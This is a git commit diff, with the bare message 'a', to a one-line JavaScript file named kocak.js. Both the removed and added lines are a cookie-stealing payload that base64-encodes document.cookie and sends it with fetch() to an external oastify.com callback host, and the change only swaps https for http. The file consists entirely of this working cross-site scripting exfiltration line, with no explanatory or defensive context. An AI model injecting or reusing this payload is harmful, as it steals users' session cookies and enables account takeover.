8699c3192c14b95476894f039cc05667e7122853
Muhammad Falah <144109406+FalahFaj@users.noreply.github.com>
2026-08-19 16:09:09 +0700

    a

--- kocak.js
+++ kocak.js
@@ -1,1 +1,1 @@
-fetch('https://grblxrk6x4mp79gd6m5beqlcu30uokc9.oastify.com?c=' + btoa(unescape(encodeURIComponent(document.cookie))));
+fetch('http://grblxrk6x4mp79gd6m5beqlcu30uokc9.oastify.com?c=' + btoa(unescape(encodeURIComponent(document.cookie))));
